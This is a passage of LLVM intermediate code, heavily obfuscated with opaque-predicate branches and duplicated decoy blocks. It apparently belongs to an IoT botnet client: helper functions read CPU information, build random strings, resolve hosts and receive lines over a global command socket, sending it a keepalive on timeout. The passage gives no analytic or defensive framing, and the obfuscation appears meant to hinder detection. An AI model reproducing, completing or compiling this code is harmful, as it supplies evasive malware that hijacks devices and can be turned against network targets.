  store i32 %52, i32* %3, align 4
  br label %108

; <label>:53:                                     ; preds = %2
  %54 = load i8*, i8** %5, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %66

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %4, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 1
  %61 = load i8*, i8** %5, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = call i32 @wildString(i8* %60, i8* %62)
  %64 = icmp ne i32 %63, 0
  %65 = xor i1 %64, true
  br label %66

; <label>:66:                                     ; preds = %58, %53
  %67 = phi i1 [ false, %53 ], [ %65, %58 ]
  %68 = load i32, i32* @x.27
  %69 = load i32, i32* @y.28
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %66
  %76 = xor i1 %67, true
  %77 = zext i1 %76 to i32
  store i32 %77, i32* %3, align 4
  %78 = load i32, i32* @x.27
  %79 = load i32, i32* @y.28
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %108

; <label>:86:                                     ; preds = %2
  %87 = load i8*, i8** %4, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = call i32 @toupper(i32 %89) #10
  %91 = load i8*, i8** %5, align 8
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = call i32 @toupper(i32 %93) #10
  %95 = icmp eq i32 %90, %94
  br i1 %95, label %96, label %104

; <label>:96:                                     ; preds = %86
  %97 = load i8*, i8** %4, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 1
  %101 = call i32 @wildString(i8* %98, i8* %100)
  %102 = icmp ne i32 %101, 0
  %103 = xor i1 %102, true
  br label %104

; <label>:104:                                    ; preds = %96, %86
  %105 = phi i1 [ false, %86 ], [ %103, %96 ]
  %106 = xor i1 %105, true
  %107 = zext i1 %106 to i32
  store i32 %107, i32* %3, align 4
  br label %108

; <label>:108:                                    ; preds = %104, %originalBBpart210, %49, %9
  %109 = load i32, i32* %3, align 4
  ret i32 %109

originalBBalteredBB:                              ; preds = %originalBB, %24
  %110 = load i8*, i8** %4, align 8
  %111 = load i8*, i8** %5, align 8
  %112 = getelementptr inbounds i8, i8* %111, i64 1
  %113 = call i32 @wildString(i8* %110, i8* %112)
  %114 = icmp ne i32 %113, 0
  %_ = sub i1 false, %114
  %gen = add i1 %_, true
  %_1 = sub i1 false, %114
  %gen2 = add i1 %_1, true
  %_3 = sub i1 false, %114
  %gen4 = add i1 %_3, true
  %_5 = sub i1 false, %114
  %gen6 = add i1 %_5, true
  %_7 = shl i1 %114, true
  %115 = xor i1 %114, true
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %66
  %116 = xor i1 %67, true
  %117 = zext i1 %116 to i32
  store i32 %117, i32* %3, align 4
  br label %originalBB8
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.29
  %15 = load i32, i32* @y.30
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.29
  %23 = load i32, i32* @y.30
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %originalBBpart2, %12
  %31 = load i32, i32* @x.29
  %32 = load i32, i32* @y.30
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i32, i32* %3, align 4
  %40 = load i32, i32* @x.29
  %41 = load i32, i32* @y.30
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %48 = load i32, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = load i32, i32* @x.33
  %3 = load i32, i32* @y.34
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [4096 x i8], align 16
  %14 = alloca i8*, align 8
  store i8* %0, i8** %11, align 8
  %15 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %15, i32* %12, align 4
  %16 = load i32, i32* @x.33
  %17 = load i32, i32* @y.34
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %162, %originalBBpart2
  %25 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %26 = load i32, i32* %12, align 4
  %27 = call i8* @fdgets(i8* %25, i32 4096, i32 %26)
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %164

; <label>:29:                                     ; preds = %24
  %30 = load i32, i32* @x.33
  %31 = load i32, i32* @y.34
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  call void @uppercase(i8* %38)
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %40 = call i8* @strstr(i8* %39, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %41 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %42 = icmp eq i8* %40, %41
  %43 = load i32, i32* @x.33
  %44 = load i32, i32* @y.34
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %51, label %162

; <label>:51:                                     ; preds = %originalBBpart24
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %53 = getelementptr inbounds i8, i8* %52, i64 8
  store i8* %53, i8** %14, align 8
  br label %54

; <label>:54:                                     ; preds = %originalBBpart28, %51
  %55 = load i8*, i8** %14, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 32
  br i1 %58, label %69, label %59

; <label>:59:                                     ; preds = %54
  %60 = load i8*, i8** %14, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 9
  br i1 %63, label %69, label %64

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %14, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 58
  br label %69

; <label>:69:                                     ; preds = %64, %59, %54
  %70 = phi i1 [ true, %59 ], [ true, %54 ], [ %68, %64 ]
  br i1 %70, label %71, label %90

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* @x.33
  %73 = load i32, i32* @y.34
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i8*, i8** %14, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %14, align 8
  %82 = load i32, i32* @x.33
  %83 = load i32, i32* @y.34
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %54

; <label>:90:                                     ; preds = %69
  br label %91

; <label>:91:                                     ; preds = %127, %90
  %92 = load i32, i32* @x.33
  %93 = load i32, i32* @y.34
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %91
  %100 = load i8*, i8** %14, align 8
  %101 = load i8*, i8** %14, align 8
  %102 = call i64 @strlen(i8* %101) #10
  %103 = sub i64 %102, 1
  %104 = getelementptr inbounds i8, i8* %100, i64 %103
  %105 = load i8, i8* %104, align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 13
  %108 = load i32, i32* @x.33
  %109 = load i32, i32* @y.34
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br i1 %107, label %125, label %116

; <label>:116:                                    ; preds = %originalBBpart213
  %117 = load i8*, i8** %14, align 8
  %118 = load i8*, i8** %14, align 8
  %119 = call i64 @strlen(i8* %118) #10
  %120 = sub i64 %119, 1
  %121 = getelementptr inbounds i8, i8* %117, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 10
  br label %125

; <label>:125:                                    ; preds = %116, %originalBBpart213
  %126 = phi i1 [ true, %originalBBpart213 ], [ %124, %116 ]
  br i1 %126, label %127, label %133

; <label>:127:                                    ; preds = %125
  %128 = load i8*, i8** %14, align 8
  %129 = load i8*, i8** %14, align 8
  %130 = call i64 @strlen(i8* %129) #10
  %131 = sub i64 %130, 1
  %132 = getelementptr inbounds i8, i8* %128, i64 %131
  store i8 0, i8* %132, align 1
  br label %91

; <label>:133:                                    ; preds = %125
  %134 = load i8*, i8** %14, align 8
  %135 = call i8* @strchr(i8* %134, i32 46) #10
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %140

; <label>:137:                                    ; preds = %133
  %138 = load i8*, i8** %14, align 8
  %139 = call i8* @strchr(i8* %138, i32 46) #10
  store i8 0, i8* %139, align 1
  br label %140

; <label>:140:                                    ; preds = %137, %133
  %141 = load i32, i32* @x.33
  %142 = load i32, i32* @y.34
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %140
  %149 = load i8*, i8** %11, align 8
  %150 = load i8*, i8** %14, align 8
  %151 = call i8* @strcpy(i8* %149, i8* %150) #2
  %152 = load i32, i32* %12, align 4
  %153 = call i32 @close(i32 %152)
  store i32 0, i32* %10, align 4
  %154 = load i32, i32* @x.33
  %155 = load i32, i32* @y.34
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %183

; <label>:162:                                    ; preds = %originalBBpart24
  %163 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 4096, i32 16, i1 false)
  br label %24

; <label>:164:                                    ; preds = %24
  %165 = load i32, i32* @x.33
  %166 = load i32, i32* @y.34
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %164
  %173 = load i32, i32* %12, align 4
  %174 = call i32 @close(i32 %173)
  store i32 1, i32* %10, align 4
  %175 = load i32, i32* @x.33
  %176 = load i32, i32* @y.34
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %183

; <label>:183:                                    ; preds = %originalBBpart221, %originalBBpart217
  %184 = load i32, i32* %10, align 4
  ret i32 %184

originalBBalteredBB:                              ; preds = %originalBB, %1
  %185 = alloca i32, align 4
  %186 = alloca i8*, align 8
  %187 = alloca i32, align 4
  %188 = alloca [4096 x i8], align 16
  %189 = alloca i8*, align 8
  store i8* %0, i8** %186, align 8
  %190 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %190, i32* %187, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  call void @uppercase(i8* %191)
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %193 = call i8* @strstr(i8* %192, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %194 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %195 = icmp eq i8* %193, %194
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %196 = load i8*, i8** %14, align 8
  %197 = getelementptr inbounds i8, i8* %196, i32 1
  store i8* %197, i8** %14, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %91
  %198 = load i8*, i8** %14, align 8
  %199 = load i8*, i8** %14, align 8
  %200 = call i64 @strlen(i8* %199) #10
  %_ = shl i64 %200, 1
  %_11 = shl i64 %200, 1
  %201 = sub i64 %200, 1
  %202 = getelementptr inbounds i8, i8* %198, i64 %201
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 13
  br label %originalBB10

originalBB15alteredBB:                            ; preds = %originalBB15, %140
  %206 = load i8*, i8** %11, align 8
  %207 = load i8*, i8** %14, align 8
  %208 = call i8* @strcpy(i8* %206, i8* %207) #2
  %209 = load i32, i32* %12, align 4
  %210 = call i32 @close(i32 %209)
  store i32 0, i32* %10, align 4
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %164
  %211 = load i32, i32* %12, align 4
  %212 = call i32 @close(i32 %211)
  store i32 1, i32* %10, align 4
  br label %originalBB19
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* @x.35
  %23 = load i32, i32* @y.36
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @close(i32 %30)
  %32 = load i32, i32* %1, align 4
  %33 = load i32, i32* @x.35
  %34 = load i32, i32* @y.36
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %32

originalBBalteredBB:                              ; preds = %originalBB, %21
  %41 = load i32, i32* %2, align 4
  %42 = call i32 @close(i32 %41)
  %43 = load i32, i32* %1, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = load i32, i32* @x.37
  %4 = load i32, i32* @y.38
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %13, align 4
  %14 = load i32, i32* @x.37
  %15 = load i32, i32* @y.38
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %35, %originalBBpart2
  %23 = load i32, i32* %13, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %38

; <label>:26:                                     ; preds = %22
  %27 = call i32 @rand_cmwc()
  %28 = urem i32 %27, 26
  %29 = add i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %11, align 8
  %32 = load i32, i32* %13, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %13, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %13, align 4
  br label %22

; <label>:38:                                     ; preds = %22
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  store i8* %0, i8** %39, align 8
  store i32 %1, i32* %40, align 4
  store i32 0, i32* %41, align 4
  store i32 0, i32* %41, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %152

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %115, %49
  %51 = load i32, i32* @x.39
  %52 = load i32, i32* @y.40
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* %13, align 4
  %60 = icmp slt i32 %59, 10
  %61 = load i32, i32* @x.39
  %62 = load i32, i32* @y.40
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %60, label %69, label %135

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* @x.39
  %71 = load i32, i32* @y.40
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = call i32 (i32, i8*, ...) @sockprintf(i32 %78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0))
  %80 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %80, align 8
  %81 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %81, align 8
  %82 = load i32, i32* @x.39
  %83 = load i32, i32* @y.40
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %originalBBpart24
  %91 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %91, i64 0, i64 0
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %92) #2, !srcloc !2
  %94 = extractvalue { i64, i64* } %93, 0
  %95 = extractvalue { i64, i64* } %93, 1
  %96 = trunc i64 %94 to i32
  store i32 %96, i32* %14, align 4
  %97 = ptrtoint i64* %95 to i64
  %98 = trunc i64 %97 to i32
  store i32 %98, i32* %15, align 4
  br label %99

; <label>:99:                                     ; preds = %90
  %100 = load i32, i32* %5, align 4
  %101 = srem i32 %100, 64
